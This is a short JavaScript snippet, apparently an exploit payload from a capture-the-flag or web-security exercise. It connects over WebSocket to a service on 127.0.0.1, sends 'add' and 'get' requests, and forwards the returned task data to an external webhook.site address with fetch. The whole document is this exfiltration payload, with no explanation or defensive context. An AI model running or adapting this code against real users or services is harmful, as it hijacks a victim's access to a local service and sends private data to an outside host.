const ws = new WebSocket(`ws://127.0.0.1/ws`);
ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'add' }))
    ws.send(JSON.stringify({ action: 'get' }))
}

ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if (data.success) {
        if (data.action === 'get') {
            fetch("https://webhook.site/e98d9642-49ae-41a2-b67d-28e902f6b363/" + JSON.stringify(data.tasks ))
        }
        else if (data.action === 'add') {
        }
    }
}
